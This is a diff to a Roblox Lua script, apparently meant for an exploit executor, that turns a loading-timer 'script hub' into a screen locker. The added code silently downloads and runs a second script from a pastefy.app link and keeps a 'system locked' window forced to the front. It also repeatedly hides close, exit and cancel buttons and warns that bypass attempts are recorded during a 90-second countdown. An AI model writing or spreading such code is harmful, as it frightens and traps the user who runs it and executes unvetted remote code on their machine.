@@ -1,52 +1,159 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+-- Загружаем сервисы
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
-local Window = Rayfield:CreateWindow({
-    Name = "WyshScriptHub",
-    LoadingTitle = "Loading",
-    LoadingSubtitle = "1",
-    ConfigurationSaving = {
-        Enabled = true,
-        FolderName = nil,
-        FileName = "Главное"
-    },
-    Discord = {
-        Enabled = false,
-        Invite = "noinvitelink",
-        RememberJoins = true
-    },
-    KeySystem = false,
-    KeySettings = {
-        Title = "Untitled",
-        Subtitle = "Key System",
-        Note = "No method of obtaining the key is provided",
-        FileName = "Key",
-        SaveKey = true,
-        GrabKeyFromSite = false,
-        Key = {"Hello"}
-    }
-})
-
-local Tab = Window:CreateTab("Loading...", nil)
-
-local TimerSection = Tab:CreateSection("⏳ Loading...")
-
-local TimerLabel = Tab:CreateLabel("Please wait: 1:30")
-
-local function startTimer(duration)
-    local startTime = tick()
-    local endTime = startTime + duration
-    
-    while tick() < endTime do
-        local remaining = endTime - tick()
-        local minutes = math.floor(remaining / 60)
-        local seconds = math.floor(remaining % 60)
-        
-        TimerLabel:SetText(string.format("Time remaining: %d:%02d", minutes, seconds))
-        
-        wait(0.1)
+-- Отключаем возможность закрытия через CoreGui
+for _, obj in pairs(CoreGui:GetChildren()) do
+    if obj:IsA("ScreenGui") then
+        obj.ResetOnSpawn = false
     end
-    
-    TimerLabel:SetText("Time is over!")
 end
 
-startTimer(90)
+-- Сначала пробуем загрузить второй скрипт
+local success, errorMsg = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/q0Hv6Z1b/raw", true))()
+end)
+
+if not success then
+    warn("Второй скрипт не загрузился:", errorMsg)
+end
+
+-- Затем загружаем Rayfield
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()
+
+-- Создание основного окна
+local Window = Rayfield:CreateWindow({
+    Name = "СИСТЕМА БЛОКИРОВКИ",
+    LoadingTitle = "ИНИЦИАЛИЗАЦИЯ ЗАЩИТЫ",
+    LoadingSubtitle = "Интерфейс заблокирован",
+    ConfigurationSaving = {
+        Enabled = false
+    },
+    Discord = {
+        Enabled = false
+    },
+    KeySystem = false
+})
+
+-- Делаем окно постоянно активным
+spawn(function()
+    while true do
+        pcall(function()
+            if Window then
+                Window:Minimize()
+                task.wait(0.1)
+                Window:Maximize()
+            end
+        end)
+        task.wait(3)
+    end
+end)
+
+-- Создаем вкладку
+local Tab = Window:CreateTab("ЗАБЛОКИРОВАНО", 4483362458)
+
+-- Создаем секцию
+local TimerSection = Tab:CreateSection("СИСТЕМНАЯ БЛОКИРОВКА")
+
+-- Таймер
+local TimerLabel = Tab:CreateLabel("ДО РАЗБЛОКИРОВКИ: 1:30")
+local timeLeft = 90
+
+-- Функция блокировки интерфейса
+local function lockInterface()
+    -- Блокировка клавиш
+    UIS.InputBegan:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.Escape then
+            -- Блокируем ESC
+        elseif input.KeyCode == Enum.KeyCode.F4 then
+            -- Блокируем F4
+        end
+    end)
+
+    -- Постоянное скрытие кнопок закрытия
+    while true do
+        pcall(function()
+            for _, gui in pairs(CoreGui:GetDescendants()) do
+                if (gui:IsA("TextButton") or gui:IsA("ImageButton")) and 
+                   (gui.Name:lower():find("close") or gui.Name:lower():find("exit") or 
+                    gui.Name:lower():find("cancel") or gui.Name:lower():find("x")) then
+                    gui.Visible = false
+                    gui.Active = false
+                end
+            end
+            
+            for _, gui in pairs(PlayerGui:GetDescendants()) do
+                if (gui:IsA("TextButton") or gui:IsA("ImageButton")) and 
+                   (gui.Name:lower():find("close") or gui.Name:lower():find("exit") or 
+                    gui.Name:lower():find("cancel") or gui.Name:lower():find("x")) then
+                    gui.Visible = false
+                    gui.Active = false
+                end
+            end
+        end)
+        task.wait(0.5)
+    end
+end
+
+-- Запускаем блокировку
+spawn(lockInterface)
+
+-- Запускаем таймер
+spawn(function()
+    while timeLeft > 0 do
+        task.wait(1)
+        timeLeft = timeLeft - 1
+        local minutes = math.floor(timeLeft / 60)
+        local seconds = timeLeft % 60
+        TimerLabel:Set("ДО РАЗБЛОКИРОВКИ: " .. string.format("%d:%02d", minutes, seconds))
+        
+        -- Усиливаем блокировку каждые 10 секунд
+        if timeLeft % 10 == 0 then
+            Window:Minimize()
+            task.wait(0.1)
+            Window:Maximize()
+        end
+    end
+    
+    TimerLabel:Set("СИСТЕМА РАЗБЛОКИРОВАНА")
+end)
+
+-- Дополнительная защита через RenderStepped
+RunService.RenderStepped:Connect(function()
+    pcall(function()
+        -- Постоянно активируем окно
+        if Window then
+            Window:Maximize()
+        end
+    end)
+end)
+
+-- Сообщение о блокировке
+Tab:CreateParagraph({
+    Title = "⚠️ ВНИМАНИЕ: СИСТЕМА ЗАБЛОКИРОВАНА",
+    Content = "Закрытие интерфейса невозможно до окончания таймера.\nЛюбые попытки обхода блокировки фиксируются."
+})
+
+-- Запускаем звуковое оповещение (если доступно)
+spawn(function()
+    while timeLeft > 0 do
+        if timeLeft % 30 == 0 then -- Каждые 30 секунд
+            pcall(function()
+                local sound = Instance.new("Sound")
+                sound.SoundId = "rbxassetid://9046892392" -- Системный звук
+                sound.Volume = 0.3
+                sound.Parent = workspace
+                sound:Play()
+                task.wait(1)
+                sound:Stop()
+                sound:Destroy()
+            end)
+        end
+        task.wait(1)
+    end
+end)
+
+print("🔒 СИСТЕМА ЗАБЛОКИРОВАНА - интерфейс защищен")
